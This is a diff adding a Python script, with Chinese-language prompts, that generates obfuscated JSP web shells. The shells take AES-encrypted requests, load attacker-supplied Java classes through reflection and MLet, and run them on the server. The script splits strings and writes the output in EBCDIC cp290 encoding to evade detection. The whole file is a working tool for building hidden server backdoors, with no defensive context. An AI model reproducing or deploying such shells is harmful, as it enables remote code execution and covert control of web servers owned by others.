@@ -1,0 +1,54 @@
+import hashlib
+import os
+import time
+import ebcdic
+
+def base():
+    key = input("key设置为\n")
+    pa = input("pass设置为\n")
+    name = input("文件名为\n")
+    if not name.endswith(".jsp"):
+        name += ".jsp"
+    if os.path.exists(name):
+        exit("文件已存在")
+    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
+    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
+    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration>String cx="'''+key+'''";String pa="'''+pa+'''";interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();String md5=md5(pa+cx);class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}public byte[] l(byte[] s,boolean m){try{javax.crypto.Cipher c = (javax.crypto.Cipher) y.sayHello(javax.crypto.Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(javax.crypto.Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{m?1:2,new javax.crypto.spec.SecretKeySpec(cx.getBytes(),"AE"+"S")});return c.doFinal(s);}catch (Exception e){return null;}}public String md5(String s) {String ret = null;try {java.security.MessageDigest m = (java.security.MessageDigest)y.sayHello(java.security.MessageDigest.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"MD5"});y.sayHello(java.security.MessageDigest.class,"update",new Class[]{byte[].class, int.class, int.class},m,new Object[]{s.getBytes(), 0, s.length()});ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret;}public String BE(byte[] bs) throws Exception {String value = null;try {Object e = y.sayHello(java.util.Base64.class, "getE"+"ncoder", new Class[]{}, null, new Object[]{});value = (String)y.sayHello(java.util.Base64.Encoder.class,"encodeT"+"oString",new Class[]{byte[].class},e,new Object[]{bs});} catch (Exception e) {try {Object e2 = y.sayHello(Class.class, "newIns"+"tance", new Class[]{}, sun.misc.BASE64Encoder.class, new Object[]{});value = (String)y.sayHello(sun.misc.BASE64Encoder.class, "enc"+"ode", new Class[]{byte[].class}, e2, new Object[]{bs});} catch (Exception e2) {}}return value;}public byte[] BD(String bs) throws Exception {byte[] value = null;try {Object d = y.sayHello(java.util.Base64.class, "getD"+"ecoder", new Class[]{}, null, new Object[]{});value = (byte[])y.sayHello(java.util.Base64.Decoder.class,"decode",new Class[]{String.class},d,new Object[]{bs});} catch (Exception e) {try {Object d2 = y.sayHello(Class.class, "newIns"+"tance", new Class[]{}, sun.misc.BASE64Decoder.class, new Object[]{});value = (byte[])y.sayHello(sun.misc.BASE64Decoder.class, "decodeB"+"uffer", new Class[]{String.class}, d2, new Object[]{bs});} catch (Exception e2) {}}return value;}public void v(byte[] d, HttpServletRequest req, HttpServletResponse res, PageContext con,HttpSession s) throws Exception {if(y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pay"+"load"})==null){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class, Object.class},s,new Object[]{"payl"+"oad",new P().O(d)});}else{y.sayHello(ServletRequest.class,"setAtt"+"ribute",new Class[]{String.class, Object.class},req,new Object[]{"param"+"eters",d});Class c = (Class) y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pa"+"yload"});Object f =  y.sayHello(Class.class,"newInst"+"ance",new Class[]{},c,new Object[]{});n(f, con, res);}}public void n(Object f, PageContext con, HttpServletResponse res) throws Exception {java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{arrOut});y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{con});java.io.PrintWriter pw = (java.io.PrintWriter)y.sayHello(ServletResponse.class,"getWr"+"iter",new Class[]{},res,new Object[]{});pw.write(md5.substring(0,16));y.sayHello(Object.class,"toStr"+"ing",new Class[]{},f,new Object[]{});pw.write(BE(l(arrOut.toByteArray(), true)));pw.write(md5.substring(16));}</jsp:declaration>'''
+    context3 = '''<jsp:scriptlet>try{String d = (String)y.sayHello(ServletRequest.class,"getPar"+"ameter",new Class[]{String.class},request,new Object[]{pa});byte[] data=l(BD(d), false);v(data, request, response, pageContext, session);}catch (Exception e){}</jsp:scriptlet></jsp:root>'''
+    f = open(name, "wb")
+    path = os.path.abspath(name)
+    f.write(context1.encode("cp037"))
+    f.write(context2.encode("cp290"))
+    f.write(context3.encode("cp290"))
+    f.close()
+    print("生成成功！！！  " + path)
+
+def raw():
+    key = input("key设置为\n")
+    name = input("文件名为\n")
+    if not name.endswith(".jsp"):
+        name += ".jsp"
+    if os.path.exists(name):
+        exit("文件已存在")
+    key = hashlib.md5(key.encode('utf-8')).hexdigest()[:16]
+    context1 = '''<?xml version="1.0" encoding='cp290'?>'''
+    context2 = '''<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2"><jsp:declaration>String cx="'''+key+'''";interface Y {public Object sayHello(Class c,String s, Class[] cs, Object o, Object[] os);}class z implements Y {public Object sayHello(Class c, String s, Class[] cs, Object o, Object[] os) {return "Hello";}}public Y gety(){java.util.concurrent.ScheduledExecutorService s = java.util.concurrent.Executors.newScheduledThreadPool(2);java.util.concurrent.Future f1 = s.submit(new java.util.concurrent.Callable() {public Object call() throws Exception {return java.lang.reflect.Proxy.newProxyInstance(z.class.getClassLoader(), z.class.getInterfaces(), new java.lang.reflect.InvocationHandler() {public Object invoke(Object proxy, java.lang.reflect.Method method, Object[] args1) throws Throwable {sun.reflect.ReflectionFactory reflectionFactory = java.security.AccessController.doPrivileged(new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());return reflectionFactory.newMethodAccessor(((Class) args1[0]).getDeclaredMethod((String) args1[1], (Class[]) args1[2])).invoke(args1[3], (Object[]) args1[4]);}});}});s.shutdown();try {return (Y)f1.get();}catch (Exception e){return null;}}Y y = gety();class P extends javax.management.loading.MLet {public P() throws Exception {super(new java.net.URL[]{},(ClassLoader) y.sayHello(Class.class, "getClas"+"sLoader", new Class[]{}, String.class, new Object[]{}));}public Class O(byte[] cb) throws Exception {return (Class)y.sayHello(ClassLoader.class,"define"+"Class", new Class[]{byte[].class, int.class, int.class},this, new Object[]{cb, 0, cb.length});}}public byte[] l(byte[] s,boolean m){try{javax.crypto.Cipher c = (javax.crypto.Cipher) y.sayHello(javax.crypto.Cipher.class,"getIns"+"tance",new Class[]{String.class},null,new Object[]{"A"+"ES"});y.sayHello(javax.crypto.Cipher.class,"ini"+"t",new Class[]{int.class, java.security.Key.class},c,new Object[]{m?1:2,new javax.crypto.spec.SecretKeySpec(cx.getBytes(),"AE"+"S")});return c.doFinal(s);}catch (Exception e){return null;}}public byte[] y(String l, HttpServletRequest request) throws Exception {int i = Integer.parseInt(l);byte[] d=new byte[i];java.io.InputStream inputStream = (java.io.InputStream) y.sayHello(ServletRequest.class,"getInp"+"utStream",new Class[]{},request,new Object[]{});int z=0;while ((z+=inputStream.read(d,z,i)) &lt; i);return l(d, false);}public void v(byte[] d, HttpServletRequest req, HttpServletResponse res, PageContext con,HttpSession s) throws Exception {if(y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pay"+"load"})==null){y.sayHello(HttpSession.class,"setAttr"+"ibute",new Class[]{String.class, Object.class},s,new Object[]{"payl"+"oad",new P().O(d)});}else{y.sayHello(ServletRequest.class,"setAtt"+"ribute",new Class[]{String.class, Object.class},req,new Object[]{"param"+"eters",d});Class c = (Class) y.sayHello(HttpSession.class,"getAttr"+"ibute",new Class[]{String.class},s,new Object[]{"pa"+"yload"});Object f =  y.sayHello(Class.class,"newInst"+"ance",new Class[]{},c,new Object[]{});n(f, con, res);}}public void n(Object f, PageContext con, HttpServletResponse res) throws Exception {java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{arrOut});y.sayHello(Object.class,"eq"+"uals",new Class[]{Object.class},f,new Object[]{con});y.sayHello(Object.class,"toStr"+"ing",new Class[]{},f,new Object[]{});java.io.OutputStream os =(java.io.OutputStream) y.sayHello(ServletResponse.class,"getOutp"+"utStream",new Class[]{},res,new Object[]{});os.write(l(arrOut.toByteArray(), true));}</jsp:declaration>'''
+    context3 = '''<jsp:scriptlet>try{String l = (String) y.sayHello(HttpServletRequest.class, "getH"+"eader", new Class[]{String.class}, request,new Object[]{"Conte"+"nt-Len"+"gth"});byte[] d = y(l, request);v(d, request, response, pageContext, session);}catch (Exception e){}</jsp:scriptlet></jsp:root>'''
+    f = open(name, "wb")
+    path = os.path.abspath(name)
+    f.write(context1.encode("cp037"))
+    f.write(context2.encode("cp290"))
+    f.write(context3.encode("cp290"))
+    f.close()
+    print("生成成功！！！  " + path)
+
+
+if __name__ == '__main__':
+    tp = input("请输入对应的类型（数字）：1.JAVA_AES_BASE664  2.JAVA_AES_RAW\n")
+    if tp == "1":
+        base()
+    elif tp == "2":
+        raw()
+    else:
+        print("??????")
+    time.sleep(10)
